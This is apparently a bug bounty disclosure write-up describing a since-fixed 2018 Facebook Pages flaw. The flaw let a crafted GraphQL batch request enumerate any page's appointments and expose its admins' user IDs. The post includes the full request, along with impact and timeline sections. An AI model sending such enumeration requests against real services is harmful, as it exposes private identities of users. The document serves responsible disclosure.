---
title: Disclose Page Admins via Facebook Appointments
description: This vulnerability permits the leakage of the page owner's identifier.
author: ramzybouyahya
date: 2018-10-12 11:33:00 +0800
categories: [Meta bug bounty]
tags: [Meta]
pin: false
math: true
mermaid: true
---

## 🧾Description

A vulnerability was discovered in Facebook’s Pages product that allowed attackers to disclose appointment details of any page, including the identity of page administrators. By crafting a GraphQL batch request with a target `pageID`, an attacker could enumerate appointments created by that page and identify the corresponding admins.

---

## ⚙️ Steps to Reproduce

### Victim Scenario
Victim (page admin of `page_a`) creates an appointment on their page.

### Attacker Steps
The attacker sends a crafted GraphQL batch request:

```http
POST /api/graphqlbatch/ HTTP/1.1
Host: www.facebook.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Connection: close

&queries={"o0":{"doc_id":"1735616686561494","query_params":{"pageID":"ID_PAGE_A","startDate":1,"endDate":9999999999999999}}}
```

**Response:**
```
The API response contained details of all appointments, including the user who created them (page admins).
```

---

## Impact

- Attackers could enumerate all appointments of any Facebook Page.  
- The response leaked the identity (user ID) of page administrators.  
- This disclosure violates admin privacy and could lead to targeted attacks or profiling.

---

## Timeline
- **Reported:** October 12, 2018  
- **Triaged:** October 15, 2018  
- **Fixed:** October 17, 2018 
- **Reward:** October 17, 2018 - $2000


---
